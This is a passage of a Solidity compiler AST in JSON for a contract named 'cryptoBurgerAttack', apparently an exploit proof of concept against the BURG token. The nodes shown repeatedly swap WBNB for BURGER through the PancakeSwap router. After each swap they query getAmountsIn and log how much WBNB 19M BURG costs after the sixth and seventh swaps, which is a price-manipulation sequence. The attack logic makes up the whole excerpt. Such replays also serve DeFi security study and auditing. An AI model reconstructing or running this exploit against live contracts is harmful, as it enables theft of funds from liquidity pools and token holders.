                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 530,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "5747:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 532,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 531,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5760:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "5747:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 533,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5764:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 538,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "5783:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 537,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "5775:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 536,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "5775:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 539,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "5775:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 535,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "5767:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 534,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "5767:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 540,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5767:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 527,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "5726:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 541,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5726:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 542,
                  "nodeType": "ExpressionStatement",
                  "src": "5726:64:0"
                },
                {
                  "expression": {
                    "id": 551,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 543,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "5800:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 548,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "5879:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 549,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "5908:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 545,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "5832:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 544,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "5815:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 546,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "5815:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 547,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "5815:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 550,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "5815:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "5800:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 552,
                  "nodeType": "ExpressionStatement",
                  "src": "5800:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722036746820737761703a20",
                        "id": 554,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5954:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_81f162ec89d6a19ffc747fa3d70a5bb48ef10c62236a7a37cff1e1e9db8f2a61",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 6th swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 6th swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 555,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "6030:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 557,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 556,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6043:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "6030:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_81f162ec89d6a19ffc747fa3d70a5bb48ef10c62236a7a37cff1e1e9db8f2a61",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 6th swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 553,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "5937:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 558,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5937:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 559,
                  "nodeType": "EmitStatement",
                  "src": "5932:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 561,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6088:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 566,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "6161:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 565,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "6153:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 564,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "6153:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 567,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "6153:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 562,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "6128:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 563,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "6128:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 568,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "6128:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 560,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "6071:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 569,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6071:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 570,
                  "nodeType": "EmitStatement",
                  "src": "6066:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 572,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "6194:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 573,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "6200:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 574,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "6208:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 576,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 575,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6221:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "6208:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 577,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6225:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 582,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "6244:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 581,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "6236:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 580,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "6236:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 583,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "6236:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 579,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "6228:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 578,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "6228:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 584,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "6228:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 571,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "6187:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 585,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6187:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 586,
                  "nodeType": "ExpressionStatement",
                  "src": "6187:64:0"
                },
                {
                  "expression": {
                    "id": 595,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 587,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "6261:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 592,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "6340:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 593,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "6369:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 589,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "6293:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 588,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "6276:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 590,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "6276:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 591,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "6276:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 594,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "6276:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "6261:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 596,
                  "nodeType": "ExpressionStatement",
                  "src": "6261:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722037746820737761703a20",
                        "id": 598,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6415:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_17d37d28f6dec0574f40e326083ad11d83a2baec8da9fc20afe17d9cc6d93bb8",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 7th swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 7th swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 599,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "6491:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 601,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 600,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6504:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "6491:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_17d37d28f6dec0574f40e326083ad11d83a2baec8da9fc20afe17d9cc6d93bb8",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 7th swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 597,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "6398:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 602,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6398:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 603,
                  "nodeType": "EmitStatement",
                  "src": "6393:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 605,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6548:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 610,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "6621:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 609,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "6613:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 608,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "6613:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 611,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "6613:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
